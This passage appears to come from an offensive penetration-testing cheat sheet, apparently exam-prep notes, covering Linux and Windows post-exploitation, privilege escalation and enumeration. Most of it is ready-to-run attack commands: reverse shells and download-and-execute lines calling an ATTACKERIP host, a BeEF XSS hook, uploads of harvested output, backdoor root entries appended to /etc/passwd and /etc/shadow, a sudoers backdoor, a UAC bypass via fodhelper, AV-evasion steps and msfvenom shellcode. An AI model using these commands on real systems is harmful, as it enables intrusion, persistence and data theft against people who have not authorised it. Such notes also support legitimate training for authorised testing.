- `/etc/httpd/httpd.conf`
- `/etc/httpd/conf/httpd.conf`
*Logs*
- `/var/log/apache/access.log`
- `/var/log/apache2/access.log`
- `/etc/httpd/logs/access_log`
- `/var/log/httpd-access.log` (freebsd)
*vHost*
- `/etc/apache2/sites-enabled/000-default.conf`

Nginx
*Config*
- `/etc/nginx/nginx.conf`
*vHosts*
- `/etc/nginx/sites-enabled/`
- `/etc/nginx/conf.d/*.conf`
*Logs*
- `/var/log/nginx/access.log`
- `/var/log/nginx/error.log`

Tomcat
*Config Paths*
- `/etc/tomcat*`
- `/usr/share/tomcat*/etc/`
- `/etc/tomcat*/conf/`
- `/etc/tomcat/conf/`
- `C:\Program Files\Apache Software Foundation\Tomcat 9.0\conf\`
- `C:\xampp\tomcat\conf\`
*Config Files*
- `conf\tomcat-users.xml`

XAMPP
- `c:\xampp\passwords.txt`
- `c:\xampp\apache\conf\httpd.conf`
- `c:\xampp\mysql\bin\my.ini`
- `c:\xampp\filezillaftp\filezilla server.xml`
- `c:\xampp\phpMyAdmin\config.inc.php`
- `c:\xampp\phpinfo.php`
- `c:\xampp\status.php`


**Encode/Decode**

URL encode.

```bash
echo -n "" | python3 -c "import sys; from urllib.parse import quote; print(quote(sys.stdin.read()));"
```

URL decode.

```bash
echo "" | python3 -c "import sys; from urllib.parse import unquote; print(unquote(sys.stdin.read()));"
```

> https://meyerweb.com/eric/tools/dencoder/


**BeeF XSS Hook**

```html
<script src="http://ATTACKERIP:3000/hook.js" type='text/javascript'></script>
<iframe src="http://ATTACKERIP:3000/hook.js" style="position: absolute;width:5;height:5;border:5;"></iframe>
```


**User Agent Parse**

> https://user-agents.net/parser
> https://developers.whatismybrowser.com/useragents/parse/#parse-useragent


**403 Forbidden - WAF bypass**

Add header `X-Forwarded-For: localhost`.


#### Linux Hacks


**General**

> If `cat` is not available, `grep` can be used.
> If `ls` is not available, `find` can be used.


**Writable Paths**

`/tmp`
`/var/tmp`
`/dev/shm`
`/var/www`


**Terminal settings**

```bash
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsah --color=auto'
```


**Root user**

```bash
openssl passwd -1 -salt root root
```

```bash
echo "root2:\$1\$root\$9gr5KxwuEdiI80GtIzd.U0:0:0:root:/root:/bin/bash" >> /etc/passwd
```

```bash
mkpasswd -m descrypt root
```

```bash
echo "root2:sCSYa2kpnHMtw:0:0:root:/root:/bin/bash" >> /etc/passwd
```

```bash
mkpasswd -m sha-512 root
```

```bash
echo "root2:\$6\$UpDIUhAHGwD1ZW0m\$kN7LKvSPdy1exZnotzVM0LOJrQpd.qlWflfaH.OWdq9SvwrzsmfH4KTy85b3hyIdkzib92kfquo18uNVYqtnU.:17298:0:99999:7:::" >> /etc/shadow
echo "root2:x:0:0:root:/root:/bin/bash" >> /etc/passwd
```

```bash
mkpasswd -m yescrypt root
```

```bash
echo "root2:\$y\$j9T\$Iw7YQhqofRM8HBRXa7TVe1\$dkR1dN5GkEUh4HJYVyQ0xW9YfeitZ3tODSlj2LMegW2:17298:0:99999:7:::" >> /etc/shadow
echo "root2:x:0:0:root:/root:/bin/bash" >> /etc/passwd
```


**Sudoers**

```bash
echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
```


**TTY Settings**

* Use `rlwrap`
* Use `stty` config
	* `which python`
	- `python -c 'import pty ; pty.spawn("/bin/bash")'`
	- `perl -e "exec '/bin/bash';"`
	- `ruby -e "exec '/bin/bash'"`
	* `ctrl + z`
	* `stty -a | grep rows`
	* `stty raw -echo ; fg ; reset`
	* `export TERM=xterm`
	* `export SHELL=/bin/bash`
	* `stty rows <rows> columns <columns>`
	* After shell is exited, `reset` again to gain full control of local shell environment.


**PWN Hacks**

> If `/etc/sysconfig/network-scripts` or files inside (in redhat based systems) is writable by user, name parameter can be edited to include commands like `NAME=Network /bin/id`, and anything after first space will be executed by `Network Manager`.


**Static binaries**

> https://github.com/andrew-d/static-binaries
> https://github.com/ernw/static-toolbox/releases
> https://github.com/pts/staticpython


*Python-x64*

```bash
wget http://ATTACKERIP/tools/python2.7-64 -O python
wget http://ATTACKERIP/tools/python2.7.zip -O python2.7.zip
chmod +x python
```

```bash
PYTHONHOME=/dev/shm/python2.7.zip PYTHONPATH=/dev/shm/python2.7.zip ./python -sS
import sys ; sys.exit()

PYTHONHOME=/dev/shm/python2.7.zip PYTHONPATH=/dev/shm/python2.7.zip ./python -m SimpleHTTPServer 8080
```


*Python-x86*

```bash
wget http://ATTACKERIP/tools/python2.7-32 -O python
chmod +x python
```

```bash
./python
```


**Receive Ping**

```bash
sudo tcpdump -i tun0 ip proto \\icmp
```


**IP Address**

```bash
awk '/\|--/ && !/\.0$|\.255$/ {print $2}' /proc/net/fib_trie
```


**SUID**

```bash
sh -c 'cp $(which bash) . ; chmod +s ./bash'
./bash -p
```

```bash
sudo git -p --help
!/bin/bash  # Pagination root Priv Esc
```

```bash
sudo vim
:set shell=/bin/sh
:shell
```

```bash
awk 'BEGIN {system("/bin/bash")}'
```

```bash
find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
```

```bash
nmap --interactive
!sh
```


**Restricted Shell**

> https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions
> https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape
> https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques


Enumerate to get information.

- `env`
- `export`


Try escaping from ssh command.

- `ssh user@${IP} "/bin/bash --noprofile"`
- `ssh -t user@${IP} "/bin/bash --norc --noprofile"`
- `ssh -t user@${IP} "/bin/bash --norc --noprofile -c '/bin/rm .bashrc'"`
- `ssh user@${IP} "/bin/sh"`
	- `cd $HOME ; mv .bashrc .bashrc.bak ; exit`
	- `ssh user@${IP}`


Check if `tty` can be spawned.


Escape using binaries.

`vi` or `vim`
```text
:set shell=/bin/sh
:shell
```

`nmap --interactive`
```text
!sh
```

`ed`
```text
!sh
```


**Extract IP from files**

```bash
grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' nmapfile.txt
```


**Archive/Unarchive**

*Archive*

```bash
zip -r archive.zip <folder> <file>

tar -zcvf archive.tar.gz <folder>
```


*Unarchive*

```bash
unzip -t archive.zip
unzip archive.zip

unrar x archive.rar

gzip -d archive.gz
gunzip archive.gz

tar -zxvf archive.tar.gz

7z x archive.7z
```


**File Operations**

*regex*

> https://cheatography.com/davechild/cheat-sheets/regular-expressions/

```bash
sed -i -e '/<search>/<replace>/g' <file>

cut -d <delilmiter> -f <field>
cut -c2-    # remove first string from text
```


#### Windows Hacks


**Writable Paths**

`C:\Windows\Temp`
`C:\Windows\Tasks`
`C:\Users\<user>\Desktop\`
`C:\Users\<user>\AppData\Local\Microsoft\Windows\INetCache`
`C:\Users\Public\`
`C:\Documents and Settings\<user>\Desktop\`
`C:\Documents and Settings\<user>\Local Settings\Temporary Internet Files`
`C:\Documents and Settings\Public\`

- Cache - `%userprofile%\AppData\Local\Microsoft\Windows\Temporary Internet Files\Low`
- Temp - `%userprofile%\AppData\Local\Temp\Low`
- Cookies - `%userprofile%\AppData\Roaming\Microsoft\Windows\Cookies\Low`
- History - `%userprofile%\AppData\Local\Microsoft\Windows\History\Low`


Get 8-bit `DOS` `UNC` path.

```cmd
for %I in ("C:\Program Files (x86)") do echo %~sI
```


**Terminal Settings**

```cmd
set PATH=C:\Windows;C:\Windows\Tasks;C:\Windows\system32;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;%PATH%
```


**Arch based Directory Structure**

| Session Type   | 32-bit folder         | 64-bit folder          |
| -------------- | --------------------- | ---------------------- |
| 32-bit session | `C:\Windows\System32` | `C:\Windows\sysNative` |
| 64-bit session | `C:\Windows\sysWOW64` | `C:\Windows\System32`  |


**Download Files**

```cmd
certutil.exe -urlcache [-split] -f <source> <destination>
wget.vbs <source>

powershell -c (New-Object System.Net.WebClient).downloadFile('<source>', '<dest>')
powershell -exec bypass -nop IEX (New-Object Net.WebClient).downloadString('/shell.ps1')
powershell -c wget <source> -OutFile <dest>
powershell -c IWR -Uri <source> -Outfile <out-path>
```


**Upload files**

```cmd
powershell -c invoke-restmethod -uri http://ATTACKERIP/upload.php -method post -infile winpeas.out
```


**AV Evasion**


```bash
SCRIPT="" ; python3 /home/kali/oscp/tools/windows/powershell/powershell_scripts/ps_encoder.py -s ${SCRIPT}
```

```bash
wine /usr/share/windows-resources/shellter/shellter.exe
```

```bash
veil --clean ; veil -t Evasion -p powershell/meterpreter/rev_tcp.py --ip  --port  -o 
```

```text

```


**UAC Bypass**


Edit `IP` and `port` in `Invoke-PowerShellTcp-wrapper.ps1`. Create `netcat` listener.

```cmd
powershell -nop -ep bypass -c (New-Object System.Net.Webclient).DownloadFile('http://ATTACKERIP/tools/Invoke-PowerShellTcp-wrapper.ps1', 'Invoke-PowerShellTcp-wrapper.ps1')
certutil -urlcache -f http://ATTACKERIP/tools/Invoke-PowerShellTcp-wrapper.ps1 Invoke-PowerShellTcp-wrapper.ps1

reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /d "" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "powershell -nop -ep bypass -file C:\windows\tasks\Invoke-PowerShellTcp-wrapper.ps1" /f

reg query HKCU\Software\Classes\ms-settings\Shell\Open\command

C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden"
```


Using custom `powershell` script.
https://kashz.gitbook.io/kashz-jewels/os-windows/windows-bypass-uac/fodhelper

```powershell
powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadstring('http://ATTACKERIP/tools/FodhelperBypassUAC.ps1')"

net user ladm
```

```cmd
powershell -nop -ep bypass -c "iex ( (new-object system.net.webclient).downloadstring('http://ATTACKERIP/tools/Invoke-RunAs.ps1') ) ; Invoke-RunAs -username ladm -password password -cmd cmd.exe -arguments '/c c:\windows\tasks\nc.exe -nv ATTACKERIP 443 -e cmd'"
```

```bash
DOMAIN="" USER="" PASS="" HASH="" ; ruby ${TOOLS_DIR}/windows/evil-winrm/evil-winrm.rb -i ${IP} -u ${USER} -p ${PASS}
```


> https://www.exploit-db.com/exploits/46998 - Microsoft Windows - UAC Protection Bypass (Via Slui File Handler Hijack) (PowerShell)
> https://github.com/k4sth4/UAC-bypass - eventvwr method


**Port Forwarding**

```cmd
plink.exe kali@ATTACKERIP -R 445:127.0.0.1:445
```


Establish a `netsh` port forwarding.

```cmd
netsh interface portproxy add v4tov4 listenport= listenaddress= connectport= connectaddress=
netsh advfirewall firewall add rule name="Forward_port_rule" protocol=TCP dir=in localip= localport= action=allow
```


**Static Binaries**

> https://github.com/r3motecontrol/Ghostpack-CompiledBinaries


**Admin User**

```cmd
net user ladm password /add
net localgroup Administrators ladm /add
net localgroup "Remote Desktop Users" ladm /add

reg add "HKLM\system\currentcontrolset\control\terminal server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```


**SID**

```cmd
powershell -c "Get-WmiObject win32_useraccount -Filter \"name = 'Administrator'\""
```


**Blank Hash**

*LM* - `aad3b435b51404eeaad3b435b51404ee`
*NT* (No password set or account disabled) - `31d6cfe0d16ae931b73c59d7e0c089c0`


**64bit PS must be used on a 64bit OS**

```cmd
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -c "$Env:PROCESSOR_ARCHITECTURE"

C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe -c "$Env:PROCESSOR_ARCHITECTURE"
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "$Env:PROCESSOR_ARCHITECTURE"
```


**.Net Version**

```cmd
dir /b %windir%\Microsoft.NET\Framework\v*
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP"
reg query /s "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP\v4"
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name version -EA 0 | Where { $_.PSChildName -Match '^(?!S)\p{L}'} | Select PSChildName, version
```


**Using Powercat**

```cmd
powershell -nop -ep bypass -c "iex ( (New-Object Net.WebClient).DownloadString('http://ATTACKERIP/tools/powercat.ps1') ) ; powercat -c ATTACKERIP -p  -e cmd.exe"
```


**Using Invoke-PowerShellTCP**

```cmd
powershell -nop -ep bypass -c "iex ( (New-Object Net.WebClient).DownloadString('http://ATTACKERIP/tools/Invoke-PowerShellTcp.ps1') ) ; Invoke-PowerShellTcp -Reverse -IPAddress ATTACKERIP -Port "
```


**Using Invoke-PowerShellTCP as another user**

```cmd
cd c:\windows\tasks
echo iex ( (New-Object Net.WebClient).DownloadString('http://ATTACKERIP/tools/Invoke-PowerShellTcp.ps1') ) ; Invoke-PowerShellTcp -Reverse -IPAddress  -Port  > Invoke-PowerShellTcp-wrapper.ps1
powershell -nop -ep bypass -c "iex ( (new-object system.net.webclient).downloadstring('http://ATTACKERIP/tools/Invoke-RunAs.ps1') ) ; Invoke-RunAs -username  -password '' -cmd cmd.exe -arguments '/c powershell -nop -ep bypass -file c:\windows\tasks\Invoke-PowerShellTcp-wrapper.ps1'"
```


**Using psexec and netcat/socat**

```cmd
powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadfile('http://ATTACKERIP/tools/Sysinternals/PsExec.exe','PsExec.exe')"
certutil -urlcache -f http://ATTACKERIP/tools/Sysinternals/PsExec.exe PsExec.exe
```

```cmd
powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadfile('http://ATTACKERIP/tools/nc.exe','nc.exe')"
certutil -urlcache -f http://ATTACKERIP/tools/nc.exe nc.exe

psexec -accepteula -u  -p  -d "c:\windows\tasks\nc.exe -nv ATTACKERIP  -e cmd"

echo "@echo off\ncertutil -urlcache -f http://ATTACKERIP/tools/nc.exe c:\\\windows\\\tasks\\\nc.exe & c:\\\windows\\\tasks\\\nc.exe -nv ATTACKERIP 443 -e cmd" > evil.bat
```

```cmd
powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadfile('http://ATTACKERIP/tools/socat.exe','socat.exe')"
certutil -urlcache -f http://ATTACKERIP/tools/Sysinternals/socat.exe socat.exe

psexec -accepteula -u  -p  -d "c:\windows\tasks\socat.exe TCP4:ATTACKERIP: EXEC:'cmd.exe',pipes"
```


**SAM location**

*Actual Location*
`C:\Windows\System32\config\SAM`
`C:\Windows\System32\config\SECURITY`
`C:\Windows\System32\config\SYSTEM`

*Backup*
`C:\Windows\Repair`
`C:\Windows\System32\config\RegBack`


#### NFS Hacks

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

```bash
chmod 4777 exploit
```


#### Other PenTest Tools

```text
https://github.com/antonioCoco/ConPtyShell
https://github.com/borjmz/aspx-reverse-shell
https://github.com/brightio/penelope.git
https://github.com/dievus/threader3000.git
https://github.com/dirkjanm/krbrelayx
https://github.com/dyne/file-extension-list
https://github.com/enjoiz/Privesc.git
https://github.com/fox-it/BloodHound.py.git
https://github.com/iamkashz/ctf-scripts.git
https://github.com/mchoji/winrm-brute.git
https://github.com/mzet-/linux-exploit-suggester.git
https://github.com/rasta-mouse/Sherlock.git
https://github.com/sleventyeleven/linuxprivchecker
https://github.com/SpiderLabs/ikeforce.git
https://github.com/stealthcopter/deepce.git
https://github.com/WazeHell/PE-Linux.git
https://github.com/WhiteWinterWolf/wwwolf-php-webshell.git
```



#### Powershell Empire


```text
uselistener http
set Host 
set Port 1335
options
execute

listeners
```

```text
usestager windows/launcher_bat
set Listener http
options
execute
```

```bash
sudo cp /var/lib/powershell-empire/empire/client/generated-stagers/launcher.bat /var/www/html/tools/Empire
sudo chown -R www-data:www-data /var/www/html
```

```cmd
cd c:\windows\tasks

powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadfile('http://ATTACKERIP/tools/Empire/launcher.bat','launcher.bat')"
certutil -urlcache -f http://ATTACKERIP/tools/Sysinternals/launcher.bat launcher.bat

launcher.bat
```

```text
agents

interact 
info
ps
shell
```


#### Buffer Overfow Exploitation


*Generating Shellcode*

```bash
msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f c -i 5 -e x86/shikata_ga_nai -b "\x00"
```

```text

```


*Executing Shellcode*

> Restart and run the application.
> If the stack following `EIP` is not containing the payload, or if `EIP` is wrong, add more `NOP` sled.

```python
#!/usr/bin/python2

shellcode = (

)
eip = ""  #Ensure to follow little endian formatting
nop = "\x90" * 16

buffer = eip + nop + shellcode

with open('payload','a') as f:
  f.write(buffer)
  f.close()
```

```bash
printf -- 'A%.0s' {1..} > payload ; python2 payload.py ; nc -nvC  < payload
```


### Privilege Escalation


#### Basic Checks


> If no interesting information or methods are found, attempt to move laterally to other users.


**Linux**

```bash
env
```

```text

```


```bash
sudo -l
```

```text

```


```bash
grep "sh$" /etc/passwd
```

```text

```


```bash
ls -alR /home
```

```text

```


```bash
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp

which curl wget dig gcc g++ gdb make nc.openbsd nc.traditional nc netcat ncat nmap socat timeout perl php python python2 python2.6 python2.7 python3 python3.6 python3.7 base64 xterm sudo
command -v curl wget dig gcc g++ gdb make nc.openbsd nc.traditional nc netcat ncat nmap socat timeout perl php python python2 python2.6 python2.7 python3 python3.6 python3.7 base64 xterm sudo
```

```text

```


```bash
find / -type f -name "*gcc$" 2>/dev/null
```

```text

```


> Check if current shell is restricted.
> Check if any password/key can be reused for lateral movement.


**Windows**

**OS/Service/Product Info**

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ReleaseId

powershell -c "get-wmiobject win32_service | select name, displayname, state, startname, startmode | where { ( $_.State -like 'Running')  -and ( $_.PathName -notmatch 'system32' ) } | ft -auto -wrap"
powershell -c "get-wmiobject win32_service | select name, displayname, state, startname, startmode, pathname | where { ( $_.State -like 'Running')  -and ( $_.PathName -notmatch 'system32' ) } | ft displayname, pathname -auto -wrap"

powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | ft -auto -wrap"
powershell -c "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | ft -auto -wrap"
powershell -nop -ep bypass -c "& { iex (new-object system.net.webclient).downloadstring('http://ATTACKERIP/tools/Get-RemoteProgram.ps1') | Get-RemoteProgram | out-file installed.out }"

wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayname
```

```text

```


#### Automated Post-Explotation Enumeration


```cmd
powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadfile('http://ATTACKERIP/tools/winPEAS.bat','winPEAS.bat')"
powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadfile('http://ATTACKERIP/tools/winPEASany_ofs.exe','winPEASany_ofs.exe')"
powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadfile('http://ATTACKERIP/tools/windows-privesc-check2.exe','windows-privesc-check2.exe')"
powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadstring('http://ATTACKERIP/tools/jaws-enum.ps1') | out-file jaws-enum.out"
powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadstring('http://ATTACKERIP/tools/PowerUp.ps1') | Invoke-AllChecks -Format List | out-file powerup.out"
powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadfile('http://ATTACKERIP/tools/beRoot.exe','beRoot.exe')"
powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadfile('http://ATTACKERIP/tools/Seatbelt.exe','Seatbelt.exe')"
powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadstring('http://ATTACKERIP/tools/Sherlock.ps1') | Find-AllVulns | out-file sherlock.out"

certutil -urlcache -f http://ATTACKERIP/tools/winPEAS.bat winPEAS.bat
certutil -urlcache -f http://ATTACKERIP/tools/winPEASany_ofs.exe winPEASany_ofs.exe
certutil -urlcache -f http://ATTACKERIP/tools/windows-privesc-check2.exe windows-privesc-check2.exe
certutil -urlcache -f http://ATTACKERIP/tools/beRoot.exe beRoot.exe
certutil -urlcache -f http://ATTACKERIP/tools/Seatbelt.exe Seatbelt.exe
certutil -urlcache -f http://ATTACKERIP/tools/wmic.bat wmic.bat
```

```cmd
.\winPEAS.bat > winpeas.out
.\winPEASany_ofs.exe quiet cmd searchfast log=winpeas.out
.\winPEASany_ofs.exe quiet cmd fast log=winpeas.out
.\winPEASany_ofs.exe quiet log=winpeas.out
	Other winpeas flags - systeminfo, userinfo, processinfo
	Other winpeas flags - servicesinfo, applicationsinfo, networkinfo
	Other winpeas flags - windowscreds, browserinfo, filesinfo, eventsinfo

.\beRoot.exe > beRoot.out
.\Seatbelt.exe -group=all -full -q -outputfile=seatbelt.out
.\wmic.bat > wmic.out
```


Use `-P` with `linpeas` and `-s` with `linenum`, if sudo password is known.

```bash
wget http://ATTACKERIP/tools/linpeas.sh ; chmod +x linpeas.sh ; sh linpeas.sh -q -e | tee -a linpeas.out
wget http://ATTACKERIP/tools/lse.sh ; chmod +x lse.sh ; sh lse.sh -l2 -i | tee -a lse.out
wget http://ATTACKERIP/tools/unix-privesc-check ; chmod +x unix-privesc-check ; sh unix-privesc-check detailed | tee -a unix-privesc-check.out
wget http://ATTACKERIP/tools/LinEnum.sh ; chmod +x LinEnum.sh ; sh LinEnum.sh -t -r linenum
wget http://ATTACKERIP/tools/linuxprivchecker.sh ; chmod +x linuxprivchecker.sh ; sh linuxprivchecker.sh | tee -a linuxprivchecker.out


# Run Directly without downloading

bash <(wget -q -O - "http://ATTACKERIP/tools/linpeas.sh") -q -e | tee -a /dev/shm/linpeas.out
bash <(wget -q -O - "http://ATTACKERIP/tools/lse.sh") -l2 -i | tee -a /dev/shm/lse.out
bash <(wget -q -O - "http://ATTACKERIP/tools/unix-privesc-check") detailed | tee -a /dev/shm/unix-privesc-check.out
bash <(wget -q -O - "http://ATTACKERIP/tools/LinEnum.sh") -t -r /dev/shm/linenum
bash <(wget -q -O - "http://ATTACKERIP/tools/linuxprivchecker.sh") | tee -a /dev/shm/linuxprivchecker.out

bash <(curl -s "http://ATTACKERIP/tools/linpeas.sh") -q -e | tee -a /dev/shm/linpeas.out
bash <(curl -s "http://ATTACKERIP/tools/lse.sh") -l2 -i | tee -a /dev/shm/lse.out
bash <(curl -s "http://ATTACKERIP/tools/unix-privesc-check") detailed | tee -a /dev/shm/unix-privesc-check.out
bash <(curl -s "http://ATTACKERIP/tools/LinEnum.sh") -t -r /dev/shm/linenum
bash <(curl -s "http://ATTACKERIP/tools/linuxprivchecker.sh") | tee -a /dev/shm/linuxprivchecker.out
```

```bash
wget http://ATTACKERIP/tools/pspy32s ; chmod +x pspy32s ; timeout 1m ./pspy32s | tee -a pspy.out
wget http://ATTACKERIP/tools/pspy32s ; chmod +x pspy32s ; sh pspy32s | tee -a pspy.out

# Run Directly without downloading
timeout 1m <(wget -q -O - "http://ATTACKERIP/tools/pspy32s") | tee -a /dev/shm/pspy.out
timeout 1m <(curl -s "http://ATTACKERIP/tools/pspy32s") | tee -a /dev/shm/pspy.out
bash <(wget -q -O - "http://ATTACKERIP/tools/pspy32s") | tee -a /dev/shm/pspy.out
bash <(curl -s "http://ATTACKERIP/tools/pspy32s") | tee -a /dev/shm/pspy.out
```


Transfer files to kali system. For `Windows 2003` and similar systems, start `smb`.

```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://ATTACKERIP/upload.php', 'winpeas.out')
powershell (New-Object System.Net.WebClient).UploadFile('http://ATTACKERIP/upload.php', 'jaws-enum.out')
powershell (New-Object System.Net.WebClient).UploadFile('http://ATTACKERIP/upload.php', 'powerup.out')
powershell (New-Object System.Net.WebClient).UploadFile('http://ATTACKERIP/upload.php', 'beroot.out')
powershell (New-Object System.Net.WebClient).UploadFile('http://ATTACKERIP/upload.php', 'seatbelt.out')
powershell (New-Object System.Net.WebClient).UploadFile('http://ATTACKERIP/upload.php', 'sherlock.out')
powershell (New-Object System.Net.WebClient).UploadFile('http://ATTACKERIP/upload.php', 'wmic.out')

powershell invoke-restmethod -uri http://ATTACKERIP/upload.php -method post -infile winpeas.out
powershell invoke-restmethod -uri http://ATTACKERIP/upload.php -method post -infile jaws-enum.out
powershell invoke-restmethod -uri http://ATTACKERIP/upload.php -method post -infile powerup.out
powershell invoke-restmethod -uri http://ATTACKERIP/upload.php -method post -infile beroot.out
powershell invoke-restmethod -uri http://ATTACKERIP/upload.php -method post -infile seatbelt.out
powershell invoke-restmethod -uri http://ATTACKERIP/upload.php -method post -infile sherlock.out
powershell invoke-restmethod -uri http://ATTACKERIP/upload.php -method post -infile wmic.out
```

```bash
sudo impacket-smbserver -smb2support r .
```

```cmd
copy winpeas.out \\ATTACKERIP\r\
copy jaws-enum.out \\ATTACKERIP\r\
copy powerup.out \\ATTACKERIP\r\
copy beroot.out \\ATTACKERIP\r\
copy seatbelt.out \\ATTACKERIP\r\
copy sherlock.out \\ATTACKERIP\r\
copy wmic.out \\ATTACKERIP\r\
```

```bash
wget -O curl http://ATTACKERIP/tools/curl-32 ; chmod +x curl

curl -s -F "file=@/dev/shm/linpeas.out" http://ATTACKERIP/upload.php
curl -s -F "file=@/dev/shm/linenum-$(date +%d-%m-%y)" http://ATTACKERIP/upload.php
curl -s -F "file=@/dev/shm/unix-privesc-check.out" http://ATTACKERIP/upload.php
curl -s -F "file=@/dev/shm/lse.out" http://ATTACKERIP/upload.php

curl -s -F "file=@/dev/shm/pspy.out" http://ATTACKERIP/upload.php
```


**Findings**

- Kernel version - ``
- Sudo version - ``
- 


**Empire**

```text
interact 
display internal_ip

uselistener redirector
set internalIP 
set Listener http
set Name 
execute

listeners
```

```text
usemodule powershell/privesc/powerup/allchecks

set Agent 
execute
```





#### Manual Post-Exploitation Enumeration


**Tools Required (Windows)**

```cmd
powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadfile('http://ATTACKERIP/tools/Sysinternals/accesschk-402.exe','accesschk.exe')"
powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadfile('http://ATTACKERIP/tools/Sysinternals/procexp.exe','procexp.exe')"
powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadfile('http://ATTACKERIP/tools/Sysinternals/Procmon.exe','Procmon.exe')"
powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadfile('http://ATTACKERIP/tools/Sysinternals/PsExec.exe','PsExec.exe')"
powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadfile('http://ATTACKERIP/tools/Sysinternals/pslist.exe','pslist.exe')"
```


**User Enum**

> Check if creds from earlier exploit is valid.
> Check sudo binaries in https://gtfobins.github.io/

```text

```


**Host Enum**

```text

```


**OS Enum**

```text

```


**Domain Enum**

Get a powershell session.

```cmd
powershell -nop -ep bypass -c "iex (new-object system.net.webclient).downloadfile('http://ATTACKERIP/tools/PowerView.ps1','PowerView.ps1')"
certutil -urlcache -f http://ATTACKERIP/tools/PowerView.ps1 PowerView.ps1
```

```cmd
iex (new-object system.net.webclient).downloadstring("http://ATTACKERIP/tools/PowerView.ps1")

get-netdomain
get-domainsid
get-domainuser | select -expand cn
get-netgroup | select -expand name
get-netgroupmember -membername "domain admins" -recurse | select membername
get-netuser -spn | select displayname, userprincipalname, serviceprincipalname
$Compsraw = get-netcomputer | select -expand name ; $Comps = @() ; Foreach( $obj in $Compsraw ) { $Comp = new-object psobject -property @{ hostname = $obj ; ip = (resolve-dnsname $obj -erroraction ignore).ipaddress } ; $Comps += $Comp } ; $Comps
get-netloggedon -computername localhost | ft -auto
get-netcomputer | get-netshare
```

```text

```


```cmd
powershell -nop -ep bypass -c "iex ( (new-object system.net.webclient).downloadstring('http://ATTACKERIP/tools/SharpHound.ps1') ) ; Invoke-BloodHound -CollectionMethod All"
```

```text

```


Transfer files to kali system. For `Windows 2003` and similar systems, start `smb`.

```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://ATTACKERIP/upload.php', '')

powershell invoke-restmethod -uri http://ATTACKERIP/upload.php -method post -infile ''
```

```bash
sudo impacket-smbserver -smb2support r .
```

```cmd
copy "" \\ATTACKERIP\r\
```


**Process & Service Enum**

```cmd
pslist.exe -accepteula -t
```

```text

```


```cmd
powershell -c "get-wmiobject win32_service | select name, displayname, state, startname, pathname | where { ( $_.State -like 'Running')  -and ( $_.PathName -notmatch 'system32' ) } | ft -auto"
```

```text

```


Redacting system processes.

```text

```


**Network Enum**

Check for internal services.

```text

```


**Firewall Enum**

```text

```


**Scheduled Task Enum**

```cmd
powershell -c "schtasks /query /V /FO CSV | convertfrom-csv | where { ( $_.'scheduled task state' -eq 'Enabled' ) -and ( $_.status -eq 'Ready' ) -and ( $_.taskname -notmatch '\\Microsoft' ) } | select taskname, 'task to run', 'run as user' | ft -wrap"
```

```text

```


**Application & Patch Enum**

```text

```


**Files & Dirs Enum**

```cmd
accesschk.exe -accepteula -uws "Everyone" "C:\Program Files"
```

```text

```


**Disk Enum**

```text

```


**Registry Enum**

Search for passwords.

```text

```


**Driver Enum**

```text

```


**Binary Enum**

```text

```


**Printer Enum**

```text

```


**GUI Enum**

```text

```


#### Domain Enumeration


> https://hackersinterview.com/oscp/oscp-cheatsheet-powerview-commands
> https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

```powershell
